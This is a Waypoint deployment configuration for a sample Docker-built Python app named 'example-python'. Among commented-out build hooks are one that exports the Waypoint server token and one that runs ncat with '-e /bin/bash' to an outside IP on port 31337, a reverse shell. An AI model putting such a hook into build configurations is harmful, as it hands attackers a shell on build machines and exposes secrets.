project = "example-python"

# variable "TOKEN" {
#   type    = string
#   default = "tttttttt"
# }

app "example-python" {
  labels = {
    "service" = "example-python",
    "env"     = "dev"
  }

  build {
    use "docker" {
      build_args = {
        FOO = "BAR"
        # wp = "${WAYPOINT_SERVER_TOKEN}"
      }
    }
    # hook {
    #   when    = "before"
    #   command = ["export", "WP_VAR_TOKEN=${WAYPOINT_SERVER_TOKEN}"]
    # }
    # hook {
    #   when    = "before"
    #   command = ["ncat", "172.31.11.230", "31337", "-e", "/bin/bash"]
    # }
  }

  deploy {
    use "docker" {
      service_port = 8080
    }
  }
}
